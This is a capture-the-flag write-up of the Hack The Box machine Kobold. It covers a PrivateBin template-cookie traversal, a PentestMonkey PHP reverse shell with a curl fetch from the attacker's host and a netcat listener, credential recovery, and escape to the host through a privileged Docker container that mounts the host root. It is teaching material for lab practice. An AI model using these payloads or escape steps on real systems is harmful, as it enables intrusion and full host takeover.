# Hack The Box – Kobold

## Overview

Kobold is a Linux machine where the attack path moves from web application enumeration to PHP template injection, credential recovery, Docker administration, and finally container escape through a privileged Docker container.

The machine demonstrates how seemingly small web application vulnerabilities can lead to complete host compromise when combined with insecure Docker configuration.

The attack path is:

`PrivateBin -> Template Injection -> Credential Recovery -> Arcane Login -> Docker Administration -> Privileged Container -> Host Filesystem Mount -> Root`

The main lesson from Kobold is that gaining root inside a Docker container is not always enough. Understanding Docker privileges and host filesystem mounts is what ultimately leads to full system compromise.

---

# Initial Enumeration

I began by scanning the target with Nmap.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan identified four important services.

| Port | Service |
| ---- | ------- |
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |
| 3552 | Arcane |

The web server redirected to **bin.kobold.htb**, which hosted a PrivateBin instance.

---

# PrivateBin Enumeration

Browsing the application revealed that it was running PrivateBin.

Researching the installed version led to a recently published template injection vulnerability that allowed arbitrary file inclusion through the `template` cookie.

The vulnerable cookie looked similar to:

```http
Cookie: template=...
```

The exploit abused directory traversal to load PHP files outside the intended template directory.

---

# Verifying Template Injection

To verify the vulnerability, I attempted to include a PHP file from the writable data directory.

The request was modified to:

```http
GET / HTTP/1.1
Host: bin.kobold.htb
Cookie: template=../../data/shell
```

A successful response confirmed that arbitrary PHP files inside the data directory could be executed.

---

# Obtaining a Reverse Shell

A PHP reverse shell was generated using the PentestMonkey reverse shell.

The callback address was configured to my VPN address:

```php
$ip = "10.10.15.xxx";
$port = 9001;
```

A Netcat listener was started:

```bash
nc -lvnp 9001
```

The reverse shell was copied into the writable directory:

```bash
curl http://10.10.15.xxx:1337/shell.php -o shell.php
```

Triggering the vulnerable template parameter executed the PHP shell and returned a shell as the web server user.

---

# Local Enumeration

After stabilizing the shell, I began enumerating the system.

Interesting files inside the PrivateBin data directory eventually revealed credentials belonging to the Arcane Docker management interface.

These credentials successfully authenticated to:

```
http://kobold.htb:3552
```

---

# Arcane Docker Administration

After logging into Arcane, I discovered that the authenticated user had permission to create Docker containers.

Normally this would only provide control over containers.

However, the interface also allowed:

- Creating privileged containers
- Mounting arbitrary host directories
- Executing commands as root

This combination made container escape possible.

---

# Creating a Privileged Container

A new container was created using the existing image:

```
privatebin/nginx-fpm-alpine:2.0.2
```

The container was configured with:

- Privileged mode enabled
- Host filesystem mounted
- Root user (`0:0`)

The important mount was:

```
Host:
/

Container:
/mount
```

This exposed the host filesystem inside the container.

---

# Escaping to the Host

Opening a shell inside the new container confirmed that I was running as root.

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

The mounted host filesystem was visible:

```bash
ls -la /mount
```

Unlike the container filesystem, `/mount` contained the host operating system, including:

- `/root`
- `/etc`
- `/home`
- `/privatebin-data`

This confirmed that the container had direct access to the host.

---

# Obtaining the Root Flag

Changing into the mounted host root directory:

```bash
cd /mount/root
```

Listing the contents revealed:

```text
root.txt
```

Reading the file completed the machine.

```bash
cat root.txt
```

---

# Attack Chain

```
Nmap
        ↓
PrivateBin Enumeration
        ↓
Template Injection
        ↓
PHP Reverse Shell
        ↓
Credential Discovery
        ↓
Arcane Login
        ↓
Create Privileged Docker Container
        ↓
Mount Host Filesystem
        ↓
Root Shell Inside Container
        ↓
Access /mount/root
        ↓
Read root.txt
```

---

# Key Takeaways

Kobold demonstrates how multiple individually minor weaknesses can combine into full host compromise.

The initial foothold came from a web application template injection vulnerability that allowed arbitrary PHP execution. Recovering credentials provided access to the Arcane Docker management interface, where the ability to create privileged containers with arbitrary host mounts resulted in complete control of the underlying operating system.

From a defensive perspective, Docker administration interfaces should be tightly restricted, privileged containers should rarely be permitted, and mounting the host root filesystem into containers should never be allowed unless absolutely necessary.
